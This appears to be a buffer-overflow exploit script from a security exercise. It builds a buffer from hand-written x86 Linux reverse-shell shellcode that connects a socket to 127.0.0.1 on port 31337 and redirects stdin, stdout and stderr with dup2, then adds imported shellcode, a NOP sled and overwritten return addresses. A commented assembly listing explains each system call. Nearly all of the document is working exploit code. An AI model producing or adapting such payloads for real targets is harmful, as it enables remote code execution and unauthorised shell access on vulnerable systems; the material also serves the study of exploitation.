from shellcode import shellcode
from struct import pack

buf_addr = 0xbffe91e8
ret_addr = 0xbffe99fc

tcp = '\x31\xc0' +'\xb0\x66' +'\x31\xdb' +'\xb3\x01'  + '\x31\xc9' +'\x51' +'\x83\xc1\x01' +'\x51' +'\x83\xc1\x01' +'\x51' +'\x89\xe1' +'\x31\xd2'+'\xcd\x80' + '\x89\xc6'+ '\x31\xc9' + '\x66\x81\xc1\x00\x01' +'\xc1\xe1\x10' +'\x80\xc1\x7f' +'\x51' +'\x66\x68\x7a\x69' +'\x31\xdb' +'\xb3\x02' +'\x66\x53' +'\x89\xe7' +'\x6a\x10' +'\x57' +'\x56' +'\x31\xc0' +'\xb0\x66' +'\x31\xdb' +'\xb3\x03' +'\x89\xe1' +'\xcd\x80' +'\x31\xc0' +'\xb0\x3f' +'\x89\xf3' +'\x31\xc9' +'\xcd\x80' +'\xb0\x3f' +'\x83\xc1\x01' +'\xcd\x80' +'\xb0\x3f' +'\x83\xc1\x01' +'\xcd\x80' 

print tcp + shellcode + "\x90"*1933 + pack("<I",buf_addr) + pack("<I",ret_addr) 

'''
# the idea is to use socketcall(int call, unsigned long *args) to call socket() (call = 1), and connect() (call = 3)
# and finally fix stdin/stdout/stderr using dup2()

# SOCK_STREAM = 1
# AF_INET = 2

; put call number into %eax
xor %eax, %eax
mov $102, %al 

; call number for socket() is 1
xor %ebx, %ebx
mov $1, %bl

; prepare args for socket(int domain, int type, int protocol)
; in our case, socket(2,1,0)
; and let ecx points to *args
xor %ecx, %ecx
push %ecx
add $1, %ecx
push %ecx
add $1, %ecx
push %ecx
mov %esp, %ecx

; set %edx to NULL
xor %edx, %edx

int $0x80

; save the returned socket to %esi
mov %eax, %esi

; prepare args for connect(int sockfd, const struct sockaddr *addr,
                   socklen_t addrlen)
; first make a struct sockaddr_in since we're using IPv4
; 127.0.0.1 => 0x0100007f
xor %ecx, %ecx
add $0x0100, %cx
shl $16, %ecx
add $0x7f, %cl
push %ecx

; port number = 31337
pushw $0x697a

; AF_INET = 2
xor %ebx, %ebx
mov $2, %bl
push %bx

; make a pointer to struct
mov %esp, %edi

; push the rest of the args
pushl $16
push %edi
push %esi

; ensure correct call numbers and *args
xor %eax, %eax
mov $102, %al
xor %ebx, %ebx
mov $3, %bl
mov %esp, %ecx

int $0x80

; call dup2(int oldfd, int newfd) to fix stdin/stdout/stderr
xor %eax, %eax
mov $063, %al
mov %esi, %ebx

; 0 - stdin, 1 - stdout, 2 - stderr
xor %ecx, %ecx

int $0x80

mov $63, %al
add $1, %ecx
int $0x80

mov $63, %al
add $1, %ecx
int $0x80

:)

'''

